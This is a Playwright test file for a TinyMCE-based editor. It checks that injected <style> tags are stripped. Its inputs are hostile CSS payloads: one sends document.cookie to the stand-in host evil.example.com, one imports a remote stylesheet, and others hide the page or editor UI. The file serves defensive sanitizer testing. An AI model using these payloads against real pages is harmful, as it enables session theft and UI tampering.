import {test, expect} from '../../fixtures/test'

// <style> tags inside content are a CSS injection vector — they can restyle
// the entire Canvas page (not just the RCE content), hide UI elements, or
// exfiltrate data via CSS attribute selectors. TinyMCE must strip them.
test.describe('<style> tag injection sanitization', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('inline <style> block is stripped from content', async ({page}) => {
    const content = await setAndGet(
      page,
      '<style>body { display: none; }</style><p>visible text</p>',
    )
    expect(content).not.toContain('<style>')
    expect(content).not.toContain('display: none')
    expect(content).toContain('visible text')
  })

  test('<style> with malicious CSS is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<style>* { background-image: url("https://evil.example.com/steal?"+document.cookie); }</style><p>content</p>',
    )
    expect(content).not.toContain('<style>')
    expect(content).not.toContain('evil.example.com')
    expect(content).toContain('content')
  })

  test('<style> inside a paragraph is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p>Before <style>.tox-editor-header { visibility: hidden; }</style> After</p>',
    )
    expect(content).not.toContain('<style>')
    expect(content).not.toContain('tox-editor-header')
    expect(content).toContain('Before')
    expect(content).toContain('After')
  })

  test('<style scoped> is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<style scoped>p { color: red; }</style><p>styled text</p>',
    )
    expect(content).not.toContain('<style')
    expect(content).toContain('styled text')
  })

  test('<style> with @import is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<style>@import url("https://evil.example.com/steal.css");</style><p>safe</p>',
    )
    expect(content).not.toContain('@import')
    expect(content).toContain('safe')
  })

  test('multiple <style> blocks are all stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<style>h1{color:red}</style><p>Para 1</p><style>h2{display:none}</style><p>Para 2</p>',
    )
    expect(content).not.toContain('<style>')
    expect(content).toContain('Para 1')
    expect(content).toContain('Para 2')
  })
})
